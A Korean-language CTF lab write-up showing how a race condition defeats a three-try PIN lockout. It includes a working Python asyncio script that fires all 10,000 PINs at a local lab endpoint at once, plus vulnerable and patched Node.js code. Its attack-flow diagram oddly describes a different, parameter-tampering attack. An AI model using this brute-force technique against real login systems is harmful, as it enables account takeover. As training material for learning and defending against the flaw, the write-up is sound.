+++
title = "VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "MFA Bypass", "Silver", "Race Condition", "TOCTOU", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (MFA Bypass)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/mfa/silver`
- **목표**: 4자리 핀(PIN) 번호를 요구하며 실패 시 3번 만에 잠기는 MFA 환경에서, 동시성 처리 결함인 **경쟁 상태(Race Condition / TOCTOU)**를 악용하여 Rate Limit을 무력화하고 10,000개의 핀을 동시에 대입하여 권한을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/mfa/silver` 경로에 로그인(`user` / `password123`) 후, 4자리 PIN 번호를 입력하는 두 번째 인증 창이 나옵니다.

**[정상 실패 테스트]**
- 1회 입력 (0000) -> `Invalid PIN. 2 attempts remaining.`
- 2회 입력 (1111) -> `Invalid PIN. 1 attempt remaining.`
- 3회 입력 (2222) -> `Account locked due to too many failed attempts.`

**[해커의 사고 과정]**
1. 4자리 핀 번호는 0000부터 9999까지 총 10,000개다.
2. 하지만 3번만 틀리면 계정이 잠겨(Account Lockout)버린다. 브루트포스는 불가능하다.
3. 그런데 만약 서버가 '남은 횟수'를 검사(Check)하고, 실패 횟수를 깎는(Use) 그 아주 짧은 찰나의 시간에 **동시에 수십, 수백 개의 요청을 퍼붓는다면?**
4. 서버는 "어? 아직 3번 안 틀렸네?" 라고 착각하고 수백 개의 요청을 동시에 처리해 버릴지도 모른다! (Time-of-Check to Time-of-Use 취약점)

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(mfa_required=false)--> [ Web Server ]
                                       |-- Trusts Client Parameter
                                       |-- Bypasses MFA
```


웹 애플리케이션(특히 멀티스레드 환경의 Java나 비동기 I/O의 Node.js)에서 동시성 제어(Concurrency Control)를 제대로 하지 않으면 발생하는 **경쟁 상태(Race Condition)** 공격을 설계합니다.

### 💡 Race Condition (TOCTOU) 원리
* **정상 처리 흐름**:
  검사(Check 횟수 < 3) -> PIN 검증 -> 실패 -> 차감(Use 횟수 - 1)
* **해커의 다중 스레드 동시 폭격**:
  스레드 1: 검사(통과) -> PIN 0000 검증 대기
  스레드 2: 검사(통과) -> PIN 0001 검증 대기
  ...
  스레드 100: 검사(통과) -> PIN 0099 검증 대기

데이터베이스 락(Lock)이나 트랜잭션 격리(Isolation)가 없으면 100개의 스레드가 '실패 차감'이 이루어지기 전에 모두 '검사(Check)'를 통과해버립니다. 우리는 이 찰나의 순간을 노려 0000부터 9999까지의 PIN을 수십 개의 병렬 스레드로 쪼개어 동시에 전송합니다.

---

## 🚀 3. 파이썬 비동기 익스플로잇 스크립트 작성

단순한 `for` 루프(직렬)로는 속도가 느려 락(Lock)이 걸리기 전에 다수의 요청을 넣을 수 없습니다. 파이썬의 `asyncio`와 `aiohttp`를 이용하여 수천 개의 비동기 요청을 동시에 쏘아 올립니다.

```python
import asyncio
import aiohttp

url = "http://localhost:3000/mfa/silver/verify"
session_cookie = "session_id=valid_user_session_cookie" # 1차 로그인 후 얻은 쿠키

async def try_pin(session, pin):
    headers = {"Cookie": session_cookie, "Content-Type": "application/x-www-form-urlencoded"}
    data = f"pin={pin:04d}"
    
    async with session.post(url, headers=headers, data=data) as response:
        text = await response.text()
        if "Welcome" in text or "FLAG" in text:
            print(f"[+] SUCCESS! Correct PIN is {pin:04d}")
            print(text)

async def main():
    print("[*] Starting Race Condition Bruteforce...")
    # TCP 커넥션 풀 제한을 풀어 한 번에 수천 개 요청 발송
    connector = aiohttp.TCPConnector(limit=5000)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(10000): # 0000 ~ 9999
            tasks.append(try_pin(session, i))
        
        # 모든 요청을 거의 동시에(Gather) 서버로 발사!
        await asyncio.gather(*tasks)

asyncio.run(main())
```

### 🔍 스크립트 실행 및 공격 결과
스크립트를 실행하면 10,000개의 POST 요청이 순식간에 서버로 쏟아집니다.
서버는 미처 "실패 횟수 차감" 연산을 데이터베이스에 쓰기(Write) 전에, 수많은 읽기(Read) 요청을 허용해 버립니다.

```text
[*] Starting Race Condition Bruteforce...
[+] SUCCESS! Correct PIN is 4829
<div class="dashboard">
  <h2>Welcome to the secure zone.</h2>
  <p>FLAG{MFA_🥈_RACE_CONDITION_A1B2C3}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

동시성 제어(Concurrency Control)의 부재가 어떻게 강력한 Rate Limiting(3회 제한)을 허수아비로 만들고 무차별 대입을 가능하게 하는지 완벽하게 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{MFA_🥈_RACE_CONDITION_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
'읽고(Check)' '쓰는(Use)' 두 가지 동작 사이에 시간 차이가 존재하며, 이 시간 차이 동안 데이터베이스의 상태가 원자적(Atomic)으로 보호받지 못해 발생한 취약점입니다.

* **취약한 서버 로직**
```javascript
const user = await db.query("SELECT * FROM users WHERE id = ?", [userId]);
if (user.failed_attempts >= 3) return res.send("Locked");

if (req.body.pin !== user.pin) {
    // 다수의 스레드가 여기까지 동시에 진입함
    await db.query("UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?", [userId]);
}
```

* **안전한 패치 가이드 (데이터베이스 락 및 원자적 연산)**
이 문제는 어플리케이션(Node.js 등) 레벨에서 해결하기 매우 어렵습니다. 데이터베이스 레벨의 **원자적(Atomic) 쿼리**나 **비관적 락(Pessimistic Locking)**을 사용해야 합니다.

```javascript
// 1. UPDATE문을 먼저 실행하여 횟수를 무조건 1 올린다 (DB 차원의 원자적 연산)
await db.query("UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?", [userId]);

// 2. 바뀐 횟수를 읽어와서 3 이상이면 아예 PIN 검사 자체를 하지 않음
const user = await db.query("SELECT * FROM users WHERE id = ?", [userId]);
if (user.failed_attempts > 3) return res.send("Locked");

// 3. 횟수가 남아있을 때만 PIN 비교 후, 맞으면 횟수를 0으로 초기화
if (req.body.pin === user.pin) {
    await db.query("UPDATE users SET failed_attempts = 0 WHERE id = ?", [userId]);
    login();
}
```
이렇게 로직 순서를 `Update(Use) -> Check` 로 변경하면 동시성 공격을 원천적으로 차단할 수 있습니다.